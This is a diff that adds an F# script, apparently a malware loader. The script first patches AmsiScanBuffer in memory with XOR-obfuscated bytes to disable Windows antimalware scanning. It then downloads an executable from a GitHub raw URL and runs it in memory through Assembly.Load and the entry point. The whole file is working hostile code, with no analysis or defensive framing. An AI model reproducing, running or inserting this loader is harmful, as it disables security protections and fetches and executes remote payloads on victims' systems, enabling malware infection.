@@ -1,0 +1,69 @@
+open System
+open System.Net.Http
+open System.Reflection
+open System.Runtime.InteropServices
+open System.Threading.Tasks
+
+// ===== AMSI Patch =====
+[<DllImport("kernel32.dll")>]
+extern IntPtr GetProcAddress(IntPtr hModule, string procName)
+
+[<DllImport("kernel32.dll")>]
+extern IntPtr LoadLibrary(string lpFileName)
+
+[<UnmanagedFunctionPointer(CallingConvention.StdCall)>]
+type VirtualProtectDelegate = 
+    delegate of IntPtr * UIntPtr * uint32 * byref<uint32> -> bool
+
+let applyAmsiPatch () =
+    try
+        let amsi = LoadLibrary("amsi.dll")
+        let kernel = LoadLibrary("kernel32.dll")
+        
+        let virtualProtectPtr = GetProcAddress(kernel, "VirtualProtect")
+        let virtualProtect = 
+            Marshal.GetDelegateForFunctionPointer(virtualProtectPtr, typeof<VirtualProtectDelegate>) 
+            :?> VirtualProtectDelegate
+        
+        let amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer")
+        
+        if amsiScanBuffer <> IntPtr.Zero then
+            let mutable oldProtect = 0u
+            // 0x40 = PAGE_EXECUTE_READWRITE
+            let success = virtualProtect.Invoke(amsiScanBuffer, UIntPtr(6u), 0x40u, &oldProtect)
+            
+            if success then
+                // Patch bytes: XOR 0xBB -> resultado: mov eax, 0x80070057; ret
+                let patch = [| 0x03uy; 0xECuy; 0xBBuy; 0xBCuy; 0x3Buy; 0x78uy |]
+                let key = 0xBBuy
+                let decoded = patch |> Array.map (fun b -> b ^^^ key)
+                Marshal.Copy(decoded, 0, amsiScanBuffer, 6)
+    with _ -> ()
+// ===== Fim do AMSI Patch =====
+
+let url = "https://github.com/quebradordecamabox/sesabe/raw/refs/heads/main/bucetinhas.exe"
+
+let downloadAssemblyAsync (url: string) = task {
+    use client = new HttpClient()
+    return! client.GetByteArrayAsync(url)
+}
+
+let runAsync = task {
+    // Aplica o patch antes de baixar/executar
+    applyAmsiPatch()
+    
+    let! asmBytes = downloadAssemblyAsync url
+    let asm = Assembly.Load(asmBytes)
+    let entry = asm.EntryPoint
+    let paramInfo = entry.GetParameters()
+    let parameters =
+        if paramInfo.Length = 1 && paramInfo.[0].ParameterType = typeof<string[]> then 
+            [| [||] :> obj |]
+        elif paramInfo.Length = 0 then 
+            [||]
+        else 
+            failwith "Unsupported entry point signature."
+    entry.Invoke(null, parameters) |> ignore
+}
+
+runAsync.GetAwaiter().GetResult();;
